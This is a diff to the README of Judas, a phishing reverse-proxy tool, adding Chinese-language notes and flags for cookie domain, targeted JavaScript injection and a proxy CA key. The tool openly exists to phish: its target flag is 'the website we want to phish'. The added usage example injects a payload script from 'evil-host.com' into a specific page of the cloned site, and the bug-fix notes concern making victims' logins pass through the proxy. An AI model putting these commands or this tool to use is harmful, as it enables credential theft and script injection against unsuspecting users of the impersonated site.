@@ -7,10 +7,14 @@ When combined with effective typosquatting, Judas is unstoppable.
 
 ```
 Usage of judas:
-  -address string
+    -address string
         Address and port to run proxy service on. Format address:port. (default "localhost:8080")
+  -cookie-domain string
+        set Cookies Domain
   -inject-js string
         URL to a JavaScript file you want injected.
+  -inject-url string
+        target URL to a JavaScript file you want injected. default * is all (default "*")
   -insecure
         Listen without TLS.
   -insecure-target
@@ -21,12 +25,15 @@ Usage of judas:
         Optional upstream proxy. Useful for torification or debugging. Supports HTTPS and SOCKS5 based on the URL. For example, http://localhost:8080 or socks5://localhost:9150.
   -proxy-ca-cert string
         Proxy CA cert for signed requests
+  -proxy-ca-key string
+        Proxy CA key for signed requests
   -ssl-hostname string
         Hostname for SSL certificate
   -target string
         The website we want to phish.
   -with-profiler
         Attach profiler to instance.
+
 ```
 
 Building
@@ -101,6 +108,14 @@ Example:
     --target https://target-url.com \
     --ssl-hostname phishingsite.com \
     --inject-js https://evil-host.com/payload.js
+```
+## 注入特定的 url
+```shell
+
+judas.go --target  https://target-url.com \
+     --insecure --address=10.10.200.1:8080 \
+     --inject-js= https://evil-host.com/payload.js \
+     --inject-url="/index.php/Index/index"
 ```
 
 Plugins
@@ -179,3 +194,10 @@ You can build a plugin using this command:
 ```
 go build -buildmode=plugin examples/searchloggingplugin/searchloggingplugin.go
 ```
+
+### 修复一些bug
+** Location 跳转 和目标域名不同域名跳转不变。相同跳转到代理地址   
+** 可选注入到特定 URL 中不区分大小写   
+** 解决 cookie 跨域导致无法登录   
+### 注意
+1. 使用域名或者特定的IP 不要使 0.0.0.0 这类
